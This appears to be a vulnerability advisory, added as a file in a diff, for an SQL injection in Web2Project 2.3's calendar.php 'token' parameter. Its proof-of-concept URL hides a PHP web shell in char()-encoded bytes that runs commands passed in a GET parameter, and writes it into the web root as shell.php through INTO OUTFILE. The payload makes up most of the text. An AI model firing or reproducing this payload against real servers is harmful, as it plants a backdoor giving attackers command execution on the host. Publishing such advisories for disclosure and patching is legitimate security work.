@@ -1,0 +1,24 @@
+# ------------------------------------------------------------------------
+# Software................Web2Project 2.3
+# Vulnerability...........SQL Injection
+# Threat Level............Critical (4/5)
+# Download................http://forums.web2project.net/
+# Discovery Date..........4/21/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A SQL injection vulnerability in Web2Project 2.3 can be exploited to
+# extract arbitrary data. In some environments it may be possible to
+# create a PHP shell.
+# 
+# 
+# --PoC--
+
+http://localhost/web2project-2.3/calendar.php?token='UNION/**/SELECT/**/CONCAT(char(60),char(63),char(112),char(104),char(112),char(32),char(115),char(121),char(115),char(116),char(101),char(109),char(40),char(36),char(95),char(71),char(69),char(84),char(91),char(39),char(67),char(77),char(68),char(39),char(93),char(41),char(59),char(32),char(63),char(62))/**/FROM/**/dual/**/INTO/**/OUTFILE'../../htdocs/shell.php'%23
